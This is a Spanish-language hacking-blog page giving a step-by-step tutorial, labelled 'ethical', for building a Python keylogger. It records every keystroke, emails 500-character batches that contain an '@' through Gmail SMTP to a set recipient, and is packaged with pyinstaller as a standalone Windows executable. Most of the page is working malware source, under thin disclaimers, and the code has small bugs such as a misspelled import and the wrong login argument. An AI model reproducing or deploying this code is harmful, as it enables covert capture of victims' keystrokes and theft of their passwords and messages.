<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- 
    - primary meta tags
  -->
  <title>Wren - Perosonal Blog Website </title>
  <meta name="title" content="Wren - Perosonal Blog Website">
  <meta name="description" content="This is a blog html template made by codewithsadee">

  <!-- 
    - favicon
  -->
  <link rel="shortcut icon" href="./favicon.svg" type="image/svg+xml">

  <!-- 
    - google font link
  -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@300;400;500;600;700;800&display=swap"
    rel="stylesheet">
  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
	<script src="https://kit.fontawesome.com/41bcea2ae3.js" crossorigin="anonymous"></script>


  <!--codigo sintax-->

  

  <!-- 
    - custom css link
  -->
  <link rel="stylesheet" href="../assets/css/style.css">
  <link rel="stylesheet" href="../assets/css/header.css">
  <link rel="stylesheet" href="../assets/css/contenedor.css">
  <link rel="stylesheet" href="../assets/css/footer.css">
  <link rel="stylesheet" type="text/css" href="../assets/css/codigo.css">


  <!-- 
    - preload images
  -->
  <link rel="preload" as="image" href="./assets/images/hero-banner.png">
  <link rel="preload" as="image" href="./assets/images/pattern-2.svg">
  <link rel="preload" as="image" href="./assets/images/pattern-3.svg">

</head>

<body id="top">

  <!-- 
    - #HEADER
  -->
  <header class="header">
		<div class="logo">
		<img class="logo1" src="./assets/images/logo/menor4.png" alt="">
		</div>
	
		<input type="checkbox" id="toggle">
		<label for="toggle"><img class="img2"  src="./assets/images/svg/menu.svg" alt="menu"></label>
	
	
		<nav class="navigation">
			<ul>
				<li><a href="../index.html"> INICIO </a></li>
				<li><a href="#"> SEGURIDAD INFORMATICA <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
				<ul>
					<li><a href="../SECTON-HACKING-WIFI/index.html">HACKING WIFI</a></li>
					<li><a href="../SECTION-HACKING-WEB/index.html">HACKING WEB</a></li>
					<li><a href="../SECTION-MALWARE/index.html">MALWARE</a></li>
          <li><a href="../SECTION-BYPASS/index.html">BYPASS</a></li>
	
				</ul>
			</li>
      <li><a href="#"> INFORMATICA <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
				<ul>
					<li><a href="../SECTION-LINUX/index.html">LINUX</a></li>
					<li><a href="../SECTION-PROGRAMACION/index.html">PROGRAMACIÓN</a></li>
					<li><a href="../SECTION-REDES/index.html">REDES</a></li>
				
	
				</ul>
			</li>
				<li><a href="">CTF <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
				<ul>
					<li><a href="../SECTION-HACKTHEBOX/index.html">HACKTHEBOX</a></li>
					
				
	
				</ul>
	
				</li>
				<li><a href="#"> ACERCA DE </a></li>
			
			
			
			</ul>
	
		</nav>

	</header>

  <main class="main-blog">

    <h1 id="h1-main">Keyloggers Éticos - Envío de Información por Correo</h1>
    <P>
      Bienvenidos a un fascinante viaje al mundo de los keyloggers éticos y su uso en la transmisión de información a través del correo electrónico, ¡todo ello programado en Python 3!
    </P>
    <h3 class="h3-importante">Importante</h3>
    <p>
      Todas las acciones y pruebas realizadas en este entorno son con fines éticos y legales. Cualquier intento de uso malicioso de esta información está estrictamente prohibido. Respetamos la privacidad y los derechos de las personas. Asegúrate de obtener siempre el consentimiento adecuado antes de realizar cualquier evaluación de seguridad o pruebas de penetración.
    </p>

    <h3 class="h3-importante" >Antes de Comenzar</h3>
    <p>
      Antes de comenzar, quisiera aclarar un punto. El servicio de Gmail actualmente no permite el acceso directo a una cuenta de correo con el correo y la contraseña a este tipo de programas. En su lugar, debemos habilitar el acceso de terceros y se nos generará un código que podemos utilizar como "contraseña" para poder enviar correos.
    </p>
    <h3 class="h3-importante">Comencemos</h3>
    <p>Primero comenzaremos instalando la biblioteca pynput desde el cmd de windows:</p>
    <p><code class="code-command">pip install pynput</code></p>    

    <p>
    
Esta biblioteca te permite controlar y monitorizar dispositivos de entrada (teclado y ratón).
    </p>
    <p>
      Comenzamos importando la clase Listener del módulo Keyboard de la biblioteca pynput. Esto nos permitirá controlar el teclado.


    </p>    


<div class="code-container">
<pre class="lenguage-python">
<code>
    from pynpyt.keyboard import Listener
</code>
</pre>
</div>
<button class="copy-button">Copiar</button>

<p>
  Importamos el módulo smtplib. El módulo smtplib define un objeto de sesión de cliente SMTP que se puede utilizar para enviar correos a cualquier máquina de Internet con un demonio de escucha SMTP o ESMTP.
</p>


<div class="code-container">
<pre class="lenguage-python">
<code>
    import smtplib
</code>
</pre>
</div>
<button class="copy-button">Copiar</button>

<p>
  Importamos la clase EmailMessage del módulo message de la biblioteca email. EmailMessage es una clase que está definida en el módulo message y se utiliza para crear y manipular mensajes de correo electrónico en Python.


</p>

<div class="code-container">
  <pre class="lenguage-python">
  <code>
    from email.message import EmailMessage  
  </code>
  </pre>
  </div>
  <button class="copy-button">Copiar</button>

<p>Comenzamos especificando el inicio del flujo del programa con <code class="code-command">if __name__ == '__main__'</code> luego declaramos e inicializamos la variable <code class="code-command">texto_a_enviar </code> con un valor inicial vacío dicha variable será la contendrá el registro de las pulsaciones de teclado, declaramos e inicializamos la variable <code class="code-command"> contador    </code> con valor "0" esta variable nos servirá para controlar el tamaño del contenido de <code class="code-command">texto_a_enviar</code> . Iniciamos un contexto <code class="code-command"> with  </code> con un objeto  <code class="code-command">Listener</code> ( <code class="code-command">with</code> se utiliza para crear un contexto de ejecución controlado en otras palabras, no tenemos que preocuparnos por cerrar lo que abrimos) el parametro <code class="code-command"> on_press</code> se utiliza para especificar una función llamada <code class="code-command"> listener_teclado </code> que más adelante crearemos y le agregamos un alias <code class="code-command"> l</code> con <code class="code-command">l.join()</code> ponemos al programa en espera de las pulsaciones de teclado.</p>    

<div class="code-container">
  <pre class="lenguage-python">
  <code>
    if __name__ == '__main__':
      texto_a_enviar = ""
      contador=0    
    
      with Listener(on_press=listener_teclado) as l:    
        l.join()</code>
  </pre>
  </div>
  <button class="copy-button">Copiar</button>

<p>Creamos la función  <code class="code-command"> listener_teclado </code> que recibirá como argumento una <code class="code-command"> key    </code>. Declaramos las variables <code class="code-command"> contador    </code> y <code class="code-command">  texto_a_enviar   </code> como globales, a la key que recibimos por argumento la seteamos como string para poder trabajar con ella, remplazamos los comillas simples " ' " por nada.     </p> 
<p>En este punto es importante resalta que en nuestro programa si presionamos la tecla "ESPACIO" se mostrará como <code class="code-command">    "Key.space" </code> lo que hace este switch case es remplazar <code class="code-command">  "Key.space"   </code>  con literalmente un espacio <code class="code-command">   " "   </code>este proceso de sigue con otras instancias de teclas para mayor legibilidad.  </p>
<p>Agregamos una condición de que si la variable <code class="code-command"> contador    </code> es igual a <code class="code-command">  500   </code> entonces ingresa a otra condición que válida si en la variable <code class="code-command"> texto_a_enviar    </code> hay un <code class="code-command"> @    </code> (lo que podremos asociar al ingreso de un correo electronico) si la condición es verdadera (TRUE) entonces llama a la función <code class="code-command"> enviar_mensaje(texto_a_enviar)</code> que recibe como argumento la variable texto_a_enviar, luego <code class="code-command"> contador    </code> se reinicia a 0 y se vacía la variable <code class="code-command">  texto_a_enviar    </code>   </p>
<p>Al final de la función <code class="code-command">  contador   </code> va aumentando de uno en uno y cada letra que pase se le agrega a <code class="code-command">  texto_a_enviar   </code> </p>


  <div class="code-container">
    <pre class="lenguage-python">
    <code>
      def listener_teclado(key):
        global contador
        global texto_a_enviar
        
        letra = str(key)
        letra = letra.replace("'", "")
        
        match letra:
            case "Key.space":
                letra = " "
            case "Key.backspace":
                letra = "(BORRAR)"
            case "Key.enter":
                letra = "\n"
            case "Key.ctrl_l", "Key.alt_gr":
                letra = ""
            case "Key.alt_gr":
                letra = ""
            case "Key.shift":
                letra = ""
            case "Key.shift_r":
                letra = ""
            case "Key.ctrl_l":
                letra = ""
            case "Key.alt_l":
                letra = ""
            case "Key.tab":
                letra = ""
            case "Key.caps_lock":
                letra = ""
            case "Key.end":
                letra = "(fin)"
            case "Key.home":
                letra = "(inicio)"
            case "Key.left":
                letra = " (<) "
            case "Key.right":
                letra = " (>) "
            case "Key.up":
                letra = " (up) "
            case "Key.down":
                letra = " (down) "
                
        if contador == 500:
            if "@" in texto_a_enviar:
                enviar_mensaje(texto_a_enviar)
            contador=0
            texto_a_enviar = ""
        
        contador += 1
        texto_a_enviar += letra
    </code>
    </pre>
    </div>
    <button class="copy-button">Copiar</button>

<p>Procedemos a crear la función <code class="code-command">enviar_mensaje()</code> a la cual le pasamos por argumento la variable <code class="code-command">  contenido_mensaje   </code>. Creamos una instancia de la clase <code class="code-command"> EmailMessage    </code> en <code class="code-command">  mensaje   </code>  seteamos como mensaje la variable <code class="code-command">  contenido_mensaje   </code>. Agregamos el asunto, nuestro correo, correo destinatario. </p>
<p>En <code class="code-command">smtp_server      </code> especificamos el tipo de servidor que montaremos en este saco un servidor Gmail, especificamos el puerto, el usuario y la contraseña. </p>
<p>Luego creamos un <code class="code-command"> try    </code> <code class="code-command">  except   </code>, intentamos montar el servidor, en el puerto especificado e inicializarlo. Intentamos el login con nuestras credenciales, mandar el mensaje y cerrar el servidor para el manejo de errores simplemente <code class="code-command">   pass  </code>(pasamos por alto)</p>


    <div class="code-container">
      <pre class="lenguage-python">
      <code>
        def enviar_mensaje(contenido_mensaje):
          mensaje = EmailMessage()
          mensaje.set_content(contenido_mensaje)
          
          mensaje['Subject'] = 'Prueba de mensaje'
          mensaje['From'] = 'tucuentagmail@gmail.com'
          mensaje['To'] = 'destinatariogmail@gmail.com'
          
          smtp_server = 'smtp.gmail.com'
          smtp_port = 587
          smtp_username = 'tucuentagmail@gmail.com'
          smtp_password = 'tucontrasena'
          
          try:
              server = smtplib.SMTP(smtp_server, smtp_port)
              server.starttls()
              
              server.login(smtp_server, smtp_password)
              server.send_message(mensaje)
              server.quit()
          except Exception:
              pass
      </code>
      </pre>
      </div>
      <button class="copy-button">Copiar</button>

  <p>Finalmente este es nuestro código completo:</p>

  <div class="code-container">
    <pre class="lenguage-python">
    <code>
      from pynput.keyboard import Listener
      import smtplib
      from email.message import EmailMessage
      
      
      
      def listener_teclado(key):
          global contador
          global texto_a_enviar
          
          letra = str(key)
          letra = letra.replace("'", "")
          
          match letra:
              case "Key.space":
                  letra = " "
              case "Key.backspace":
                  letra = "(BORRAR)"
              case "Key.enter":
                  letra = "\n"
              case "Key.ctrl_l", "Key.alt_gr":
                  letra = ""
              case "Key.alt_gr":
                  letra = ""
              case "Key.shift":
                  letra = ""
              case "Key.shift_r":
                  letra = ""
              case "Key.ctrl_l":
                  letra = ""
              case "Key.alt_l":
                  letra = ""
              case "Key.tab":
                  letra = ""
              case "Key.caps_lock":
                  letra = ""
              case "Key.end":
                  letra = "(fin)"
              case "Key.home":
                  letra = "(inicio)"
              case "Key.left":
                  letra = " (<) "
              case "Key.right":
                  letra = " (>) "
              case "Key.up":
                  letra = " (up) "
              case "Key.down":
                  letra = " (down) "
                  
          if contador == 500:
              if "@" in texto_a_enviar:
                  enviar_mensaje(texto_a_enviar)
              contador=0
              texto_a_enviar = ""
          
          contador += 1
          texto_a_enviar += letra
      
      
      def enviar_mensaje(contenido_mensaje):
          mensaje = EmailMessage()
          mensaje.set_content(contenido_mensaje)
          
          mensaje['Subject'] = 'Prueba de mensaje'
          mensaje['From'] = 'tucuentagmail@gmail.com'
          mensaje['To'] = 'destinatariogmail@gmail.com'
          
          smtp_server = 'smtp.gmail.com'
          smtp_port = 587
          smtp_username = 'tucuentagmail@gmail.com'
          smtp_password = 'tucontrasena'
          
          try:
              server = smtplib.SMTP(smtp_server, smtp_port)
              server.starttls()
              
              server.login(smtp_server, smtp_password)
              server.send_message(mensaje)
              server.quit()
          except Exception:
              pass
      
          
      if __name__ == '__main__':
          texto_a_enviar = ""
          contador=0    
          
          with Listener(on_press=listener_teclado) as l:
              l.join()
    </code>
    </pre>
    </div>
    <button class="copy-button">Copiar</button>

    <h3 class="h3-importante">Crear un ejecutable de nuestro código</h3>
    <p>Nos dirigimos al cmd de nuestro sistema Windows y ejecutamos:</p>

    <p><code class="code-command">pip install pyinstaller    </code></p>
    <p>Nos dirigimos al directorio donde se encuentra nuestro keylogger.py y ejecutamos: </p>

  <p> <code class="code-command">    pyinstaller --onefile keylogger.py </code></p>
  <p>Nos creará dos directorios uno build y otro dist, en el directorio dist se encuentra nuestro ejecutable. No olvidar de practicar en un entorno controlado y de forma ética.</p>
  <br><br>
</main>





  <!-- 
    - #BACK TO TOP
  -->
  <footer class="footer"> 
    <div class="izquierda">  
  
      <a href="#" id="footer-a"><a href="#">
        <img src="../assets/images/logo/menorH.png" alt="logo h4ckdino">
      </a>  © 2023 h4ckdino, Inc. </a>
      <a href="#" id="footer-a">Ponte en contacto con nosotros</a>
      <a href="#" id="footer-a" >Configuración de cookies</a>
      <a href="#" id="footer-a" >Politica de privacidad</a>
      
  
      
    </div>
  </footer>
  





  <!-- 
    - custom js link
  -->

  <!-- 
    - ionicon link
  -->
  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>

  <script src="../assets/js/copiar-boton.js"></script>
  <script src="./assets/js/script.js"></script>


</body>

</html>